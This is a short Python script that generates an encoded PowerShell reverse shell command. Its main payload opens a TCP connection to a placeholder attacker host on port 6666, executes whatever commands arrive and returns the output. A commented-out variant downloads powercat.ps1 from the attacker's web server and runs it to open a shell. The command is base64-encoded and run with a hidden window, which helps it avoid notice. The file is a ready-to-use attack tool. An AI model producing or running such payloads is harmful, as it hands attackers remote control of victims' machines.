import sys
import base64

# Long payload without powercat
payload = '$client = New-Object System.Net.Sockets.TCPClient("${ATTACKER_IP}", 6666);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()

# Shorter payload using powercat
#  payload = "IEX(New-Object System.Net.WebClient).DownloadString('http://${ATTACKER_IP}:${ATTACKER_WEB_PORT}/powercat.ps1');powercat -c ${ATTACKER_IP} -p ${ATTACKER_PORT} -e powershell"
#  cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()
print(cmd)
